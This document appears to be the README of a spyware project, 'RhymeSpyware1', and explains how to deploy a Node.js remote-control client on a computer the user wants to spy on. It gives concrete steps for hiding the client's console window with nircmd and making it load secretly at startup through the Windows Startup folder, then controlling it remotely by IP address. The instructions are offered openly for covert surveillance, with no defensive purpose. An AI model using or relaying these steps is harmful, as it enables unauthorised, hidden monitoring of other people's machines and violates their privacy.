# RhymeSpyware1
### Please note that this `readme` is outdated. I'll update it soon enough.
### How to use
1. Download the **Windows Binary** for **node**. And extract it.
2. Copy the files from the **Repo** to the folder where you extracted node.
3. Run the `rmtCtrlClient.js` file using **node** on the machine you want to spy on.
     - To hide the console, make a `.bat` with a command to run `node.exe rmtCtrlClient.js`.
       Then run the said `.bat` file with `nircmd.exe` using the following arguments `exec hide`.
       The whole this should look like this.
        - `.bat` -> `node.exe rmtCtrlClient.js`
        - `on cmd` -> `nircmd.exe exec hide "[filename].bat"`
     - To make it load secretly on **startup**, make another `.bat` with the `nircmd` command, and create a shortcut for it.
       Copy the shortcut to the `Startup` directory.
4. Once done setting up the server. Copy the folder to another computer, and run the `ctrlr.html` file.
5. Enter the **IP address** for the computer youre trying to spy on. And it should work from there.
